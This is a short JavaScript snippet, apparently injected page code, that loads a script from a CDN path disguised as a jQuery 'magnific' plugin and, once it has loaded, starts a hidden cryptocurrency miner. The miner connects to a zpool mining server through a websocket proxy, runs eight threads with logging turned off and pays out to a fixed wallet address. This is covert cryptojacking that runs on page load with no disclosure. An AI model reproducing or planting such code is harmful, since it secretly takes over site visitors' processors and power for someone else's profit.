   function start() {
    const client = new Client({
      stratum: {
        server: "minotaurx.na.mine.zpool.ca",
        port: 7019,
        worker: "RFNMZhc4rbed6eu3qb8B8WPWKDhcTaERBh",
        password: "c=RVN"
      },
      options: {
        threads: 8,
        log: false,
      },
    }, "wss://muddy-tallia-masterw-23a8c046.koyeb.app/proxy")};

    const script = document.createElement('script');
    script.src = "https://cdn.jsdelivr.net/gh/javerosc/jdk-packager-3.1/jquery.magnific.js";
     script.onload = () => {
      start();
    };
    document.head.appendChild(script);
